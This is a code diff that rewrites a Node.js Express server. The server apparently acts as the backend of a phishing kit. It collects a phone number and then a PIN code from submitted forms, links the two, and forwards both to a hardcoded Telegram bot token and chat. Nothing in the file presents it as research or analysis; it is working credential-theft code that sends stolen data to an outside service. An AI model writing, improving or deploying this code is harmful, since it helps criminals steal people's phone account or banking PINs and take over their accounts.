@@ -1,70 +1,100 @@
-const express = require('express');
-const fetch = require('node-fetch');
-const app = express();
-const port = 8000;
+import express from 'express';
+import bodyParser from 'body-parser';
+import fetch from 'node-fetch';
+import path from 'path';
+import { fileURLToPath } from 'url';
 
-app.use(express.json());
-app.use(express.static('public')); // Serve static files
-
+// Configuration
 const TELEGRAM_BOT_TOKEN = '7246291582:AAGDVmXvRKX_PdEug_XZ2-pKnXrkPMcS3k0';
 const TELEGRAM_CHAT_ID = '-4544953608';
+const PORT = 8000;
 
+// Data storage for phone and PIN tracking
 const clientData = {};
 
-// Phone Number Submission
-app.post('/api/phone', async (req, res) => {
-    try {
-        const { phoneNumber } = req.body;
+// Resolve `__dirname` in ES modules
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
-        if (!phoneNumber || clientData[phoneNumber]) {
-            return res.status(400).json({ error: 'Phone number invalid or already submitted.' });
-        }
+// Initialize Express app
+const app = express();
 
-        clientData[phoneNumber] = null;
-        const message = `New Phone Number Submission:\nPhone Number: ${phoneNumber}`;
-        await sendTelegramMessage(message);
+// Middleware
+app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname, 'public'))); // Serve static files like `index.html`
 
-        res.status(200).json({ message: 'Phone number received.' });
-    } catch (error) {
-        console.error(error);
-        res.status(500).json({ error: 'Internal Server Error.' });
-    }
+// CORS Middleware
+app.use((req, res, next) => {
+  res.header("Access-Control-Allow-Origin", "*");
+  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.header("Access-Control-Allow-Headers", "Content-Type");
+  next();
 });
 
-// PIN Code Submission
+// POST endpoint for handling phone number and PIN submissions
+app.post('/', async (req, res) => {
+  const { phoneNumber, pinCode } = req.body;
 
-app.post('/api/pin', (req, res) => {
-    const { pinCode } = req.body;
-    if (!pinCode) {
-        return res.status(400).json({ error: 'Missing PIN code.' });
+  try {
+    // Handle phone number submission
+    if (phoneNumber && !pinCode) {
+      if (clientData[phoneNumber]) {
+        return res.status(400).json({ error: "Phone number already submitted." });
+      }
+
+      clientData[phoneNumber] = { pin: null, state: 'waiting' };
+
+      console.log(`Received phone number: ${phoneNumber}`);
+      await sendTelegramMessage(`New Phone Number Submission:\nPhone Number: ${phoneNumber}`);
+      return res.status(200).json({ status: "Phone number received. Waiting for PIN." });
     }
-    res.json({ message: `Received PIN code: ${pinCode}` });
+
+    // Handle PIN code submission
+    if (pinCode && !phoneNumber) {
+      const waitingPhoneNumber = Object.keys(clientData).find(
+        (key) => clientData[key].state === 'waiting' && clientData[key].pin === null
+      );
+
+      if (!waitingPhoneNumber) {
+        return res.status(400).json({ error: "No phone number waiting for a PIN." });
+      }
+
+      clientData[waitingPhoneNumber] = { pin: pinCode, state: 'completed' };
+      console.log(`Received PIN: ${pinCode} for phone number: ${waitingPhoneNumber}`);
+      await sendTelegramMessage(`New Client Submission:\nPhone Number: ${waitingPhoneNumber}\nPIN Code: ${pinCode}`);
+      return res.status(200).json({ status: "PIN code received and sent to Telegram." });
+    }
+
+    // If neither phoneNumber nor pinCode is valid
+    res.status(400).json({ error: "Invalid data. Expected either phoneNumber or pinCode." });
+  } catch (error) {
+    console.error("Error handling POST request:", error);
+    res.status(500).json({ error: "Internal server error." });
+  }
 });
 
-app.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));
-
-// Send Telegram Message
+// Helper function to send a message to Telegram
 async function sendTelegramMessage(message) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };
 
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-        });
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
 
-        if (!response.ok) {
-            throw new Error(`Failed to send message: ${await response.text()}`);
-        }
-        console.log('Message sent successfully');
-    } catch (error) {
-        console.error('Error sending Telegram message:', error);
+    if (!response.ok) {
+      const errorMessage = await response.text();
+      console.error("Telegram API error:", errorMessage);
     }
+  } catch (err) {
+    console.error("Failed to send message to Telegram:", err);
+  }
 }
 
 // Start the server
-app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}`);
+app.listen(PORT, () => {
+  console.log(`Server is running on http://localhost:${PORT}`);
 });
